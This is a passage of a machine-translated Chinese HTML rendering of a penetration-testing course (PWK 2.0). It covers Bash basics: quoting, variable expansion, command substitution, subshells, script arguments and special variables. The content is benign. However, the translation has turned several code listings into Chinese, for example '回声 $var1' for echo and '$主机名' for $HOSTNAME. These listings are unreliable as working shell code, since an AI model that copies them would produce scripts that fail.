<div style="position:absolute;top:125748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这不一定是我们所期望的。</font><font style="vertical-align: inherit;">为了解决这个问题，我们可以使用单引号 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 或双</font><font style="vertical-align: inherit;">引号</font></font></nobr></div>
<div style="position:absolute;top:125767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">引号 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 将我们的文本括</font><font style="vertical-align: inherit;">起来</font><font style="vertical-align: inherit;">。但是，Bash 对单引号和双引号的处理方式不同。当</font></font></nobr></div>
<div style="position:absolute;top:125787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遇到单引号，Bash 会逐字解释每个封闭的字符。</font><font style="vertical-align: inherit;">当封闭在</font></font></nobr></div>
<div style="position:absolute;top:125806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">双引号，除“ </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”、“ </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">`</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”和“\”</font><font style="vertical-align: inherit;">之外的所有字符都按字面意思查看</font><font style="vertical-align: inherit;">，这意味着变量将</font></font></nobr></div>
<div style="position:absolute;top:125825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在所附文本的初始替换过程中扩展。</font></font></nobr></div>
<div style="position:absolute;top:125858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个简单的例子将有助于澄清这一点：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:125893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">greeting='Hello World'</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:125975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">114 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 基金会，2016 年），https://www.linux.com/blog/absolute-path-vs-relative-path-linuxunix</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:126103;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="107"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 107 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:126136;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:127213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:127213;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:127213;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">107</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $greeting</font></font></font></b></nobr></div>
<div style="position:absolute;top:126248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你好，世界</font></font></nobr></div>
<div style="position:absolute;top:126282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">greeting2="新 $greeting"</font></font></font></b></nobr></div>
<div style="position:absolute;top:126316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $greeting2</font></font></font></b></nobr></div>
<div style="position:absolute;top:126333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新的你好世界</font></font></nobr></div>
<div style="position:absolute;top:126353;left:172"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 139 - 使用单引号和双引号来说明使用字符串的复杂变量赋值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，用单引号括起来的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">greeting</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声明</font><font style="vertical-align: inherit;">保留了我们文本的值</font></font></nobr></div>
<div style="position:absolute;top:126401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完全没有将空格解释为命令分隔符。</font><font style="vertical-align: inherit;">然而，在双引号中——</font></font></nobr></div>
<div style="position:absolute;top:126421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">封闭的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">greeting2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声明</font><font style="vertical-align: inherit;">，Bash 将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$greeting</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扩展</font><font style="vertical-align: inherit;">为其值（“Hello World”），尊重</font></font></nobr></div>
<div style="position:absolute;top:126440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“$”字符的特殊含义。</font></font></nobr></div>
<div style="position:absolute;top:126473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以将变量的值设置为命令或程序的结果。</font><font style="vertical-align: inherit;">这被称为</font></font></nobr></div>
<div style="position:absolute;top:126492;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令替换</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">115</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们获取命令或程序的输出（什么</font></font></nobr></div>
<div style="position:absolute;top:126512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常会打印到屏幕上）并将其保存为变量的值。</font></font></nobr></div>
<div style="position:absolute;top:126545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，请将变量名称放在括号“ </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">()</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”中，并以“ </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”字符开头：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user=$(whoami)</font></font></font></b></nobr></div>
<div style="position:absolute;top:126613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $user</font></font></font></b></nobr></div>
<div style="position:absolute;top:126630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:126650;left:255"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 140 - 说明命令替换和变量的使用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 140 中，我们将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的输出分配</font><font style="vertical-align: inherit;">给了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量。</font><font style="vertical-align: inherit;">然后我们</font></font></nobr></div>
<div style="position:absolute;top:126698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示了它的价值。</font><font style="vertical-align: inherit;">使用反引号或严重的命令替换的替代语法，</font></font></nobr></div>
<div style="position:absolute;top:126718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符（`）如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user2=`whoami`</font></font></font></b></nobr></div>
<div style="position:absolute;top:126787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $user2</font></font></font></b></nobr></div>
<div style="position:absolute;top:126804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:126823;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 141 - 命令替换的替代语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反引号方法较旧，通常不鼓励使用，因为这两种方法存在差异</font></font></nobr></div>
<div style="position:absolute;top:126872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令替换方法的行为。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">116</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样重要的是要注意命令</font></font></nobr></div>
<div style="position:absolute;top:126891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">替换发生在子shell中，对子shell中变量的更改不会改变变量</font></font></nobr></div>
<div style="position:absolute;top:126910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从主进程。</font><font style="vertical-align: inherit;">下面的示例演示了这一点：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./subshel​​l.sh</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:126962;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash -x</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量 1=值 1</font></font></nobr></div>
<div style="position:absolute;top:127013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 $var1</font></font></nobr></div>
<div style="position:absolute;top:127047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量 2=值 2</font></font></nobr></div>
<div style="position:absolute;top:127064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 $var2</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:127143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">115 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2019），https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html</font></font></font></nobr></div>
<div style="position:absolute;top:127163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">116 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（BashFAQ，2016 年），http://mywiki.wooledge.org/BashFAQ/082</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:127291;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="108"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 108 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:127324;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:128401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:128401;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:128401;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">108</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:127420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$(var1=newvar1)</font></font></nobr></div>
<div style="position:absolute;top:127436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 $var1</font></font></nobr></div>
<div style="position:absolute;top:127470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">`var2=newvar2`</font></font></nobr></div>
<div style="position:absolute;top:127488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 $var2</font></font></nobr></div>
<div style="position:absolute;top:127521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./subshel​​l.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:127538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ var1=value1</font></font></nobr></div>
<div style="position:absolute;top:127555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 回声值 1</font></font></nobr></div>
<div style="position:absolute;top:127572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值1</font></font></nobr></div>
<div style="position:absolute;top:127589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ var2=value2</font></font></nobr></div>
<div style="position:absolute;top:127606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 回声值 2</font></font></nobr></div>
<div style="position:absolute;top:127623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值2</font></font></nobr></div>
<div style="position:absolute;top:127640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">++ 变量 1=新变量 1</font></font></nobr></div>
<div style="position:absolute;top:127657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 回声值 1</font></font></nobr></div>
<div style="position:absolute;top:127674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值1</font></font></nobr></div>
<div style="position:absolute;top:127691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">++ 变量 2=新变量 2</font></font></nobr></div>
<div style="position:absolute;top:127708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 回声值 2</font></font></nobr></div>
<div style="position:absolute;top:127725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值2</font></font></nobr></div>
<div style="position:absolute;top:127742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font></nobr></div>
<div style="position:absolute;top:127761;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 142 - 子 shell 中的命令替换</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，首先注意我们改变了shebang，添加了-x 标志。</font><font style="vertical-align: inherit;">这指示 Bash</font></font></nobr></div>
<div style="position:absolute;top:127810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印额外的调试输出，以便我们可以更轻松地查看已执行的命令</font></font></nobr></div>
<div style="position:absolute;top:127829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和他们的结果。</font><font style="vertical-align: inherit;">当我们查看此输出时，请注意以单个“+”字符开头的命令</font></font></nobr></div>
<div style="position:absolute;top:127849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在当前 shell 中执行，并且以双“++”开头的命令在</font></font></nobr></div>
<div style="position:absolute;top:127868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子壳。</font></font></nobr></div>
<div style="position:absolute;top:127901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这让我们可以清楚地看到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的第二个声明</font><font style="vertical-align: inherit;">发生在一个</font></font></nobr></div>
<div style="position:absolute;top:127920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">subshel​​l 并且没有像初始声明那样更改当前 shell 中的值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:127955;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2.1 参数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并非所有 Bash 脚本都需要参数。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">117</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，了解如何</font></font></nobr></div>
<div style="position:absolute;top:128012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们由 Bash 解释以及如何使用它们。</font><font style="vertical-align: inherit;">我们已经执行了 Linux 命令</font></font></nobr></div>
<div style="position:absolute;top:128031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有论据。</font><font style="vertical-align: inherit;">例如，当我们运行命令</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -l /var/log 时</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/log</font></font></font></b></nobr></div>
<div style="position:absolute;top:128051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令的</font><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:128084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本也不例外。</font><font style="vertical-align: inherit;">我们可以提供命令行参数并在我们的脚本中使用它们：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:128118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./arg.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:128136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:128169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "前两个参数是 $1 和 $2"</font></font></nobr></div>
<div style="position:absolute;top:128203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./arg.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:128237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./arg.sh 你好</font></font></font></b></nobr></div>
<div style="position:absolute;top:128254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前两个参数是 hello and there</font></font></nobr></div>
<div style="position:absolute;top:128274;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 143 - 说明 Bash 中参数的使用</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:128351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">117 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Parameter_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(computer_programming)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:128479;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="109"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 109 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:128512;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:129589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:129589;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:129589;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">109</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 143 中，我们创建了一个简单的 Bash 脚本，为其设置可执行权限，然后运行它</font></font></nobr></div>
<div style="position:absolute;top:128627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有两个论点。</font><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 $</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ 2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量代表传递给第一个和第二个参数</font></font></nobr></div>
<div style="position:absolute;top:128646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剧本。</font><font style="vertical-align: inherit;">让我们探索一些特殊的 Bash 变量：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:128680;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量名称 说明</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128702;left:267"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 美元</font></font></nobr></div>
<div style="position:absolute;top:128702;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本的名称</font></font></nobr></div>
<div style="position:absolute;top:128722;left:251"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 美元 - 9 美元</font></font></nobr></div>
<div style="position:absolute;top:128722;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本的前 9 个参数</font></font></nobr></div>
<div style="position:absolute;top:128742;left:266"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$#</font></font></nobr></div>
<div style="position:absolute;top:128742;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递给 Bash 脚本的参数数量</font></font></nobr></div>
<div style="position:absolute;top:128762;left:264"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$@</font></font></nobr></div>
<div style="position:absolute;top:128762;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递给 Bash 脚本的所有参数</font></font></nobr></div>
<div style="position:absolute;top:128782;left:268"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$?</font></font></nobr></div>
<div style="position:absolute;top:128782;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最近运行的进程的退出状态</font></font></nobr></div>
<div style="position:absolute;top:128802;left:267"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$$</font></font></nobr></div>
<div style="position:absolute;top:128802;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前脚本的进程ID</font></font></nobr></div>
<div style="position:absolute;top:128822;left:252"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$USER</font></font></nobr></div>
<div style="position:absolute;top:128822;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行脚本的用户的用户名</font></font></nobr></div>
<div style="position:absolute;top:128843;left:227"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$主机名</font></font></nobr></div>
<div style="position:absolute;top:128843;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器的主机名</font></font></nobr></div>
<div style="position:absolute;top:128863;left:237"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$随机</font></font></nobr></div>
<div style="position:absolute;top:128863;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个随机数</font></font></nobr></div>
<div style="position:absolute;top:128882;left:243"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$LINENO</font></font></nobr></div>
<div style="position:absolute;top:128882;left:351"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本中的当前行号</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:128902;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 4 - 特殊的 Bash 变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中一些特殊变量在调试脚本时非常有用。</font><font style="vertical-align: inherit;">例如，我们可能</font></font></nobr></div>
<div style="position:absolute;top:128951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够获取命令的退出状态来判断是否成功执行</font></font></nobr></div>
<div style="position:absolute;top:128971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或不。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:129005;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2.2 读取用户输入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
